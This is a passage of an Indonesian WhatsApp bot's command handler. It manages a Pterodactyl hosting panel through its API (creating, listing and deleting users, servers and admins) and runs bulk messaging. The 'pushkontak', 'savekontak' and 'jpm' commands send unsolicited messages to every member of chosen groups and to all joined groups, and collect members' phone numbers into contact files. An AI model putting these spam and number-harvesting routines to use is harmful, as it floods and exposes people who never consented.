m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//=========================================//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
  try {
    if (!isCreator && !jangan) return Reply(mess.owner)
    if (!text) return m.reply(example("username"))
    global.panel = text

    var ram, disknya, cpu
    if (command == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = global.panel.toLowerCase() + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = capital(username) + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": "Server",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domain + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    var orang = m.isGroup ? m.sender : m.chat
    if (m.isGroup) await m.reply("*✅ Berhasil membuat panel!*\nData sudah dikirim ke private chat")

    var teks = `*✅ Berhasil Membuat Panel Kamu!*

📡 *ID Server:* ${server.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}

🌐 *Spesifikasi:*
• RAM: ${ram=="0"?"Unlimited":ram/1000+"GB"}
• Disk: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
• CPU: ${cpu=="0"?"Unlimited":cpu+"%"}

🌍 ${global.domain}

⚠️ *Syarat & Ketentuan:*
- Expired 1 bulan
- Garansi 15 hari (1x replace)
- Claim garansi wajib bawa bukti chat pembelian
`

    // Kirim pakai nativeFlowMessage
    let msgii = await generateWAMessageFromContent(orang, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender] },
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {"name":"cta_url","buttonParamsJson":`{"display_text":"🌐 Login Server Panel","url":"${global.domain}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Username","copy_code":"${user.username}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"📋 Copy Password","copy_code":"${password}"}`}
              ]
            })
          })
        }
      }
    }, { userJid: orang, quoted: m })

    await conn.relayMessage(orang, msgii.message, { messageId: msgii.key.id })
    delete global.panel

  } catch (e) {
    console.error(e)
    m.reply("❌ Terjadi error: " + e.message)
  }
}
break

//=========================================//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
• Nama : *${i.attributes.first_name}*
• Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//=========================================//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
  let s = server.attributes

  // Ambil status server
  let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + capikey
    }
  })
  let data = await f3.json();
  let status = data.attributes ? data.attributes.current_state : s.status;

  // Ambil data user (owner server)
  let userRes = await fetch(domain + "/api/application/users/" + s.user, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  })
  let userData = await userRes.json();
  let userAttr = userData.attributes || {}

  messageText += `\n* ID : *${s.id}*
• Nama : *${s.name}*
• Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
• CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
• Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
• Created : *${s.created_at.split("T")[0]}*
• Username : *${userAttr.username || "Tidak diketahui"}*
• Gmail : *${userAttr.email || "Tidak diketahui"}*\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break
//=========================================//

case "delalladmin": {
    if (!isCreator) return m.reply(`Fitur ini hanya untuk developer bot`);
    if (!text) return m.reply(`*Contoh penggunaan:*\n${cmd} admin1,admin2`);

    try {
        // Ambil semua admin dari semua halaman
        let page = 1;
        let allAdmins = [];

        while (true) {
            const res = await fetch(`${domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikey}`
                }
            });

            const data = await res.json();
            const users = data.data;

            if (!users || users.length === 0) break;

            allAdmins.push(...users.filter(u => u.attributes.root_admin === true));
            page++;
        }

        // Daftar admin yang tidak boleh dihapus (support multi nama dipisah koma)
        const daftarAman = text.split(",").map(a => a.trim().toLowerCase());

        // Filter admin yang boleh dihapus
        const targetAdmins = allAdmins.filter(
            user => !daftarAman.includes(user.attributes.username.toLowerCase())
        );

        if (targetAdmins.length === 0) {
            return m.reply("Tidak ada admin yang bisa dihapus (mungkin semua masuk daftar pengecualian).");
        }

        let sukses = 0;
        let gagal = [];

        for (const admin of targetAdmins) {
            const idadmin = admin.attributes.id;
            const username = admin.attributes.username;

            const delRes = await fetch(`${domain}/api/application/users/${idadmin}`, {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikey}`
                }
            });

            if (delRes.ok) {
                sukses++;
            } else {
                gagal.push(username);
            }
        }

        let replyMsg = `✅ Sukses menghapus ${sukses} admin panel.`;
        if (daftarAman.length > 0) {
            replyMsg += `\n🙅‍♂️ Tidak dihapus: ${daftarAman.map(a => `*${a}*`).join(", ")}`;
        }
        if (gagal.length > 0) {
            replyMsg += `\n❌ Gagal hapus: ${gagal.map(u => `*${u}*`).join(", ")}`;
        }

        await m.reply(replyMsg);

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat menghapus admin.");
    }
}
break;

//=========================================//

case "delalladmin2": {
    if (!isCreator) return m.reply(`Fitur ini hanya untuk developer bot`);
    if (!text) return m.reply(`*Contoh penggunaan:*\n${cmd} admin1,admin2`);

    try {
        // Ambil semua admin dari semua halaman
        let page = 1;
        let allAdmins = [];

        while (true) {
            const res = await fetch(`${domainV2}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikeyV2}`
                }
            });

            const data = await res.json();
            const users = data.data;

            if (!users || users.length === 0) break;

            allAdmins.push(...users.filter(u => u.attributes.root_admin === true));
            page++;
        }

        // Daftar admin yang tidak boleh dihapus (support multi nama dipisah koma)
        const daftarAman = text.split(",").map(a => a.trim().toLowerCase());

        // Filter admin yang boleh dihapus
        const targetAdmins = allAdmins.filter(
            user => !daftarAman.includes(user.attributes.username.toLowerCase())
        );

        if (targetAdmins.length === 0) {
            return m.reply("Tidak ada admin yang bisa dihapus (mungkin semua masuk daftar pengecualian).");
        }

        let sukses = 0;
        let gagal = [];

        for (const admin of targetAdmins) {
            const idadmin = admin.attributes.id;
            const username = admin.attributes.username;

            const delRes = await fetch(`${domainV2}/api/application/users/${idadmin}`, {
                method: "DELETE",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apikeyV2}`
                }
            });

            if (delRes.ok) {
                sukses++;
            } else {
                gagal.push(username);
            }
        }

        let replyMsg = `✅ Sukses menghapus ${sukses} admin panel.`;
        if (daftarAman.length > 0) {
            replyMsg += `\n🙅‍♂️ Tidak dihapus: ${daftarAman.map(a => `*${a}*`).join(", ")}`;
        }
        if (gagal.length > 0) {
            replyMsg += `\n❌ Gagal hapus: ${gagal.map(u => `*${u}*`).join(", ")}`;
        }

        await m.reply(replyMsg);

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat menghapus admin.");
    }
}
break;

//=========================================//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//=========================================//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//=========================================//

case "produk": case "listproduk": {
 await slideButton(m.chat, [m.sender])
}
break

//=========================================//
case "setjeda": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :*\npush 5000\njpm 6000\n\nKeterangan format waktu:\n1 detik = 1000\n\nJeda waktu saat ini:\nJeda Pushkontak > ${global.delayPushkontak}\nJeda JPM > ${global.delayJpm}`);

    let args = text.split(" ");
    if (args.length < 2) return m.reply(`*Contoh :*\npush 5000\njpm 6000\n\nKeterangan format waktu:\n1 detik = 1000\n\nJeda waktu saat ini:\nJeda Pushkontak > ${global.delayPushkontak}\nJeda JPM > ${global.delayJpm}`);

    let target = args[0].toLowerCase(); // push / jpm
    let value = args[1];

    if (isNaN(value)) return m.reply("Harus berupa angka!");
    let jeda = parseInt(value);

    let fs = require("fs");
    let path = require.resolve("./settings.js");
    let data = fs.readFileSync(path, "utf-8");

    if (target === "push") {
        let newData = data.replace(/global\.delayPushkontak\s*=\s*\d+/, `global.delayPushkontak = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.delayPushkontak = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda Push Kontak* menjadi *${jeda}* ms`);
    } 
    
    if (target === "jpm") {
        let newData = data.replace(/global\.delayJpm\s*=\s*\d+/, `global.delayJpm = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.delayJpm = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda JPM* menjadi *${jeda}* ms`);
    }

    return m.reply(`Pilihan tidak valid!\nGunakan: *push* atau *jpm*`);
}
break;

case "pushkontak": case "puskontak": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh :* pesannya`)
global.textpushkontak = text
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response ${u.id}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Pushkontak\n`
}, { quoted: m })
}
break

case "pushkontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.textpushkontak) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await conn.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id.includes(".net") ? v.id : v.jid)
    .map(v => v.id.includes(".net") ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await m.reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);
  
  global.statuspush = true
  
 delete global.textpushkontak
 let count = 0
 
  for (const mem of halls) {
    if (global.stoppush) {
    delete global.stoppush
    delete global.statuspush
    break
    }
    await conn.sendMessage(mem, { text: teks }, { quoted: FakeChannel });
    await sleep(global.JedaPushkontak);
    count += 1
  }
  
  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${count}* member.`, jidawal)
}
break

case "pushkontak2": case "puskontak2": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.includes("|")) return m.reply(`Masukan pesan & nama kontak\n*Contoh :* ${cmd} pesan|namakontak`)
global.textpushkontak = text.split("|")[0]
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response2 ${u.id}|${text.split("|")[1]}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup PushkontakV2\n`
}, { quoted: m })
}
break

case "pushkontak-response2": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.textpushkontak) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak2* pesannya|namakontak`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await conn.groupMetadata(text.split("|")[0])
  const halls = data.participants
    .filter(v => v.id.includes(".net") ? v.id : v.jid)
    .map(v => v.id.includes(".net") ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await m.reply(`🚀 Memulai pushkontak autosave kontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);
  
  global.statuspush = true
  
 delete global.textpushkontak
 let count = 0
 
  for (const mem of halls) {
    if (global.stoppush) {
    delete global.stoppush
    delete global.statuspush
    break
    }    
    const contactAction = {
        "fullName": `${text.split("|")[1]} #${mem.split("@")[0]}`,
        "lidJid": mem, 
        "saveOnPrimaryAddressbook": true
    };
    await conn.addOrEditContact(mem, contactAction);
    await conn.sendMessage(mem, { text: teks }, { quoted: FakeChannel });
    await sleep(global.JedaPushkontak);
    count += 1
  }
  
  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nTotal kontak berhasil disimpan *${count}*`, jidawal)
}
break


case "savenomor":
case "sv":
case "save": {
    if (!isCreator) return m.reply(mess.owner)

    let nomor, nama

    if (m.isGroup) {
        if (!text) return m.reply(`*Contoh penggunaan di grup:*\n@tag|nama\natau reply target dengan:\nnama`)

        // Jika ada tag
        if (m.mentionedJid[0]) {
            nomor = m.mentionedJid[0]
            nama = text.split("|")[1]?.trim()
            if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* @tag|nama`)
        } 
        // Jika reply
        else if (m.quoted) {
            nomor = m.quoted.sender
            nama = text.trim()
        } 
        // Jika input manual nomor
        else if (/^\d+$/.test(text.split("|")[0])) {
            nomor = text.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
            nama = text.split("|")[1]?.trim()
            if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* 628xxxx|nama`)
        } 
        else {
            return m.reply(`*Contoh penggunaan di grup:*\n${cmd} @tag|nama\natau reply target dengan:\nnama`)
        }
    } else {
        // Private chat hanya nama
        if (!text) return m.reply(`*Contoh penggunaan di private:*\nnama`)
        nomor = m.chat
        nama = text.trim()
    }

    const contactAction = {
        "fullName": nama,
        "lidJid": nomor,
        "saveOnPrimaryAddressbook": true
    };

    await conn.addOrEditContact(nomor, contactAction);

    return m.reply(`✅ Berhasil menyimpan kontak

- Nomor: ${nomor.split("@")[0]}
- Nama: ${nama}`)
}
break

case "savekontak": case "svkontak": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Masukan namakontak\n*Contoh :* FyzzBotzz`)
global.namakontak = text
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.savekontak-response ${u.id}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Savekontak\n`
}, { quoted: m })
}
break

case "savekontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.namakontak) return m.reply(`Data nama savekontak tidak ditemukan!\nSilahkan ketik *.savekontak* namakontak`);
  try {
    const res = await conn.groupMetadata(text)
    const halls = res.participants
      .filter(v => v.id.endsWith('.net'))
      .map(v => v.id)
      .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

    if (!halls.length) return m.reply("Tidak ada kontak yang bisa disimpan.")
    let names = text
    const existingContacts = JSON.parse(fs.readFileSync('./library/database/contacts.json', 'utf8') || '[]')
    const newContacts = [...new Set([...existingContacts, ...halls])]

    fs.writeFileSync('./library/database/contacts.json', JSON.stringify(newContacts, null, 2))

    // Buat file .vcf
    const vcardContent = newContacts.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${global.namakontak} - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")

    // Kirim ke private chat
    if (m.chat !== m.sender) {
      await m.reply(`Berhasil membuat file kontak dari grup ${res.subject}\n\nFile kontak telah dikirim ke private chat\nTotal ${halls.length} kontak`)
    }

    await conn.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./library/database/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `File kontak berhasil dibuat ✅\nTotal ${halls.length} kontak`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    )
    
    delete global.namakontak

    fs.writeFileSync("./library/database/contacts.json", "[]")
    fs.writeFileSync("./library/database/contacts.vcf", "")

  } catch (err) {
    m.reply("Terjadi kesalahan saat menyimpan kontak:\n" + err.toString())
  }
}
break
//=========================================//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
